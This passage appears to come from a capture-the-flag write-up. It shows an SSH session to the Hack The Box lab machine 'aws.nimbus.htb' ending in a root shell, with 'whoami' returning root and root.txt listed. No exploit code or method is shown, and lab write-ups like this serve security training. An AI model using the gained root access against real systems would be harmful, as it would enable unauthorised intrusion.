ED25519 key fingerprint is: SHA256:5qkwPI6m/wtokgKube+SzSe8Eew7l45AuShWf63C1lo
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'aws.nimbus.htb' (ED25519) to the list of known hosts.
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-124-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Thu Jun 25 08:41:32 PM UTC 2026

  System load:           0.16
  Usage of /:            66.4% of 9.43GB
  Memory usage:          15%
  Swap usage:            0%
  Processes:             235
  Users logged in:       0
  IPv4 address for eth0: 10.129.33.139
  IPv6 address for eth0: dead:beef::a0de:adff:fe5e:ae17


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

4 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Last login: Thu Jun 25 20:41:33 2026 from <tu_ip>
root@nimbus:~# whoami
root
root@nimbus:~# ls /root                                                                                                                
root.txt
```
